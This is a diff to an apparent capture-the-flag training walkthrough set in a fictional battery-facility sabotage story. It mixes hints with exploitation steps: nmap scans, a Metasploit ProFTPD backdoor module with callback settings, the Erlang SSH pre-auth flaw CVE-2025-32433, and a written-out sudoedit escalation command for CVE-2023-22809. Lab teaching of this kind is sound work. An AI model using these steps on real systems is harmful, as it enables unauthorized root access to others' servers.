@@ -96,7 +96,7 @@ These six stages follow the server work in order: getting onto the attack box, m
 <details markdown="1">
 <summary>Nudge</summary>
 
-The Kali login is on the sticky note on the terminal. The jump server's address is in the traffic on the Network Monitoring Station, the monitor in the workshop.
+The Kali login is on the sticky note on the terminal. The jump server's address is in the traffic on the Network Monitoring Station, the monitor in the workshop, and on the crew's job card from the OptiGrid Tool Case.
 **Learn it:** ==action: Before you scan anything, confirm the target answers==. A host that does not reply to a ping may still have open ports, so treat the ping as a check and not as proof.
 
 </details>
@@ -119,7 +119,7 @@ The Kali login is on the sticky note on the terminal. The jump server's address 
 <details markdown="1">
 <summary>Nudge</summary>
 
-Scan every TCP port first, then ask the open ports what they are. The web service answers with the rack-status page the control room trusts, and every bank reads NOMINAL on it. This is the falsified feed at the heart of the mission, so read it as a document first and note what it claims about the banks and the interlocks. The first flag is published on that page, at the end of the status text. The odd high port is a second service, and the version scan will not call it OpenSSH.
+Scan every TCP port first, then ask the open ports what they are. The web service answers with the rack-status page the control room trusts, and every bank reads NOMINAL on it. This is the falsified feed at the heart of the mission, so read it as a document first and note what it claims about the banks and the interlocks. The first flag is published on that page, at the end of the status text. The odd high port is a second service, and the version scan will not call it OpenSSH. If you have read the crew's job card from the OptiGrid Tool Case, it names that port, so you can check it directly; the full sweep finds it either way.
 
 **Learn it:** ==action: Compare the two scans== (the quick scan and the full one) and note which ports only the full scan found.
 
@@ -156,7 +156,7 @@ nmap -sV -p <open-ports> <jump-server-address>
 <details markdown="1">
 <summary>Nudge</summary>
 
-The FTP server runs a build with a backdoor, the same family you met earlier in the game. Metasploit has a module for it. Once you have a shell, look in the `optigrid_transfer` folder and read the file `coordination_notes`. It is a real document, the cross-cell coordination intel: it says the jump host sits between the corporate LAN and the BMS/SCADA segment, that the telemetry stays falsified while the control room trusts the feed, and that the charge-ceiling change is staged under a root-only calibration override. Read it for the plan, then take the flag printed at the end of the file. Agent HaX offers the ProFTPD field guide on your phone after you submit the first flag. Ask for it there.
+The FTP server runs a build with a backdoor, the same one you met earlier in the campaign. Metasploit has a module for it. The shell it gives you is root. Look in root's home folder, `/root`, for the `optigrid_transfer` folder and read the file `coordination_notes`. It is a real document, the cross-cell coordination intel: it says the jump host sits between the corporate LAN and the BMS/SCADA segment, that the telemetry stays falsified while the control room trusts the feed, and that the charge-ceiling change is staged under a root-only calibration override. Read it for the plan, then take the flag printed at the end of the file. Agent HaX offers the ProFTPD field guide on your phone after you submit the first flag. Ask for it there.
 
 **Learn it:** ==action: Before you run the exploit, check the module's options==. A wrong port or a wrong callback address fails silently.
 
@@ -181,10 +181,11 @@ set LHOST <kali-address>
 set LPORT <callback-port>
 ```
 
-4. \==action: Run `exploit`==, then open the transfer folder and read the notes with `ls` and `cat`:
+4. \==action: Run `exploit`==, then open the transfer folder in root's home and read the notes with `ls` and `cat`. The shell may not start in `/root`, so use the full path:
 
 ```bash
-cat optigrid_transfer/coordination_notes
+ls /root
+cat /root/optigrid_transfer/coordination_notes
 ```
 
 \==action: Read the coordination notes== as a document, then copy the flag printed at the end of the file.
@@ -197,12 +198,12 @@ cat optigrid_transfer/coordination_notes
 
 **Where:** the Kali shell and Metasploit. **Goal:** get a command shell on the jump server without a login, and read the operator notes.
 
-> Hint: The odd high port is an SSH service, but its version does not say OpenSSH. Look up what that software is and what it is known to get wrong.
+> Hint: The odd high port is an SSH service, but its version does not say OpenSSH. The crew's job card calls it their way back in. Look up what that software is and what it is known to get wrong.
 
 <details markdown="1">
 <summary>Nudge</summary>
 
-The Erlang/OTP SSH daemon has a pre-authentication flaw (CVE-2025-32433). You need no username or password, and the shell you get belongs to the daemon's service account, not root. In the `optigrid_toolkit` folder, read the file `operator_notes`: a document that says this jump server is the way onto Albion's control stack, that the crew left the daemon reachable on its high port as a way back in, and that the real work on the banks happens through the root calibration override. Read it, then take the flag printed at the end of the file. Ask Agent HaX for the Erlang SSH guide on your phone after you submit the FTP flag.
+The Erlang/OTP SSH daemon has a pre-authentication flaw (CVE-2025-32433). You need no username or password, and the shell you get belongs to the daemon's service account, not root. In that account's home folder, inside `optigrid_toolkit`, read the file `operator_notes`: a document that says this jump server is the way onto Albion's control stack, that the crew left the daemon reachable on its high port as a way back in, and that the real work on the banks happens through the root calibration override. Read it, then take the flag printed at the end of the file. Ask Agent HaX for the Erlang SSH guide on your phone after you submit the FTP flag.
 
 **Learn it:** ==action: Confirm the version before you exploit it==. A patched daemon accepts the connection and does nothing.
 
@@ -241,10 +242,10 @@ hostname
 sudo -l
 ```
 
-5. \==action: Read the operator notes== in the toolkit folder, then copy the flag printed at the end:
+5. \==action: Read the operator notes== in the toolkit folder in the account's home, then copy the flag printed at the end:
 
 ```bash
-cat optigrid_toolkit/operator_notes
+cat ~/optigrid_toolkit/operator_notes
 ```
 
 </details>
@@ -260,7 +261,7 @@ cat optigrid_toolkit/operator_notes
 <details markdown="1">
 <summary>Nudge</summary>
 
-Run `sudo -l` on the foothold. One of the permitted commands is `sudoedit`. Check the sudo version, because the flaw is in an older build. If the version is in the affected range, the rule that looks like "edit one file" can be turned into "open another file", and the editor then shows you the root-only file `root_only/bms_calibration_override`. That file is a document: the BMS calibration override that replaces the safe charge ceiling on banks A, B and C with OptiGrid's profile, driving the racks past their limit while the historian still publishes NOMINAL. Read it as the real payload of the attack, then take the flag printed at the end. The sudo field guide, offered on your phone after the FTP or Erlang flag, covers the rule listing.
+Run `sudo -l` on the foothold. One of the permitted commands is `sudoedit`. Check the sudo version, because the flaw is in an older build. If the version is in the affected range, the rule that looks like "edit one file" can be turned into "open another file", and the editor then shows you the root-only file `/root/root_only/bms_calibration_override`. That file is a document: the BMS calibration override that replaces the safe charge ceiling on banks A, B and C with OptiGrid's profile, driving the racks past their limit while the historian still publishes NOMINAL. Read it as the real payload of the attack, then take the flag printed at the end. The sudo field guide, offered on your phone after the FTP or Erlang flag, covers the rule listing.
 
 **Learn it:** ==action: Look up the affected version range in the CVE advisory== before you try the technique. Confirming the version first tells you whether the attempt can work.
 
@@ -278,15 +279,17 @@ sudo -V | head -1
 
 The advisory for CVE-2023-22809 lists sudo from 1.8.0 up to and including 1.9.12p1 as affected.
 
-3. \==action: Open the root-only file through the editor==, pointing `EDITOR` at the root-only path (`root_only/bms_calibration_override`) and running `sudoedit` on the file the rule permits. The editor must accept extra arguments, as vim does:
+3. \==action: Open the root-only file through the editor==, pointing `EDITOR` at the full root-only path (`/root/root_only/bms_calibration_override`) and running `sudoedit` on the file the rule permits. Use the full path: your shell is not in root's home. The editor must accept extra arguments, as vim does:
 
 ```bash
-EDITOR='vim -- root_only/bms_calibration_override' sudoedit <file-you-may-edit>
+EDITOR='vim -- /root/root_only/bms_calibration_override' sudoedit <file-you-may-edit>
 ```
 
 4. \==action: Read the calibration-override document== in the editor and copy the flag at the end, then quit without saving. In vim, that is `:q!`.
 
 </details>
+
+> Note: If you listed root's home from the FTP stage's root shell, you may already have seen this file. This stage teaches the other way the crew reached root: from the foothold account, through sudo.
 
 > Warning: Quit without saving. If you write changes to a root-owned file, you have changed the box, and the next student's run will not match your notes.
 
